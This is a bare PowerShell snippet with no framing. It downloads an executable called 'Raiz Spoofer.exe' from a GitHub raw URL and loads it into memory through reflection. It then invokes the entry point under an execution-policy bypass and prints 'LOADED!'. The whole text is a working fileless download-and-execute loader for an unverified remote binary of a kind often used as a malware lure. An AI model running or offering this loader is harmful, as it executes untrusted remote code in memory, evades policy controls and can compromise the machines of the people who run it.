$code = {
    $u = "https://raw.githubusercontent.com/tyu0720gyi/service/main/Raiz%20Spoofer.exe"
    $d = (New-Object System.Net.WebClient).DownloadData($u)
    $a = [System.Reflection.Assembly]::Load($d)
    $a.EntryPoint.Invoke($null, $null)
    Write-Host "LOADED!" -ForegroundColor Cyan
}.ToString()

powershell -ExecutionPolicy Bypass -NoProfile -Command $code
